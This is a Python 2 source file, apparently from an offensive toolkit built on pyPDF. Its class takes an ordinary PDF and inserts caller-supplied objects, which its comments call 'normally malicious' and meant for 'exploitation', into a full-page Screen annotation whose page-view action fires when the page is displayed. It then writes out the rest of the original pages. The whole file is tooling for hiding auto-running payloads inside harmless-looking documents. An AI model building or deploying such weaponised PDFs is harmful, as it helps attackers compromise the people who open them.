##Little class to easily take an existing PDF, add in (normally malicious) objects ofr exploitation
## on page 1 and then add the rest of the pages from the original PDF after. Based on pyPDF

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

class PDFMergeError(Exception):
    
    def __init__(self, expression, message):
        
        self.expression = expression
        self.message    = message
        
    def __str__ (self):
        
        return repr(self.message)
    

class PDFMerge:
    """
    Class to merge arbitrary PDF with malicious objects and return a new PDF
    """
    
    def __init__ (self, source_pdf, dest_pdf):
        
        """
        Set the source pdf, read it and set various things based upon it
        Set where we are going to write the new PDF to
        """
        self.source_pdf = source_pdf
        self.dest_pdf   = dest_pdf
        
        try:
            self.input_pdf=PdfFileReader(file(self.source_pdf,'rb'))
        except Exception, err:
            raise PDFMergeError("pdfMergeError","Problem opening the source pdf '%s' - %s "%(self.source_pdf, err))
    
    def addin (self, pdf_objs, pagenum=0):
        """
        Take the supplied pre-constructed pdf object and add it to the specified page (by deafult the first page - page 0)
        
        The PASSED OBJECT must be a LIST of objects so as we can add multiple things to the same page
        """
        ##Make sure the passed in pdf object is a list of objects
        if type(pdf_objs) != type([]):
            pdf_objs = list(pdf_objs)
        
        ##Get page to add object to
        targetpage = self.input_pdf.getPage(pagenum)
        
        ##Output stream construuctor
        self.output=PdfFileWriter()
        
        ##Add all the pages before the page specified as the page to put the objects on
        for p in range(0, pagenum):
            page = self.input_pdf.getPage(p)
            self.output.addPage(page)
        
        ##Add each object to the specified page
        for obj in pdf_objs:
            
            ##Construct the object to add into the malicious PDF page - with activation action
            targetpage[NameObject("/Annots")]=ArrayObject((DictionaryObject(),))
            targetpage["/Annots"][0][NameObject("/Type")]=NameObject("/Annot")
            targetpage["/Annots"][0][NameObject("/Subtype")]=NameObject("/Screen")
            targetpage["/Annots"][0][NameObject("/Rect")]=ArrayObject((NumberObject(0),NumberObject(0),NumberObject(800),NumberObject(800)))
            targetpage["/Annots"][0][NameObject("/AA")]=DictionaryObject()
            targetpage["/Annots"][0]["/AA"][NameObject("/PV")]=obj
            ##Add it
            self.output.addPage(targetpage)
        
        ##Add all the pages after the page specified as the page to put the objects on
        for p in range(pagenum+1, self.input_pdf.getNumPages()):
            page = self.input_pdf.getPage(p)
            self.output.addPage(page)
        
        try:
            self.output.write(file('%s'%(self.dest_pdf),'wb'))        
        except Exception, err:
            raise PDFMergeError("pdfMergeError","Problem writing the new pdf '%s' - %s "%(self.dest_pdf, err))
        
        return file(self.dest_pdf,'rb').read()
        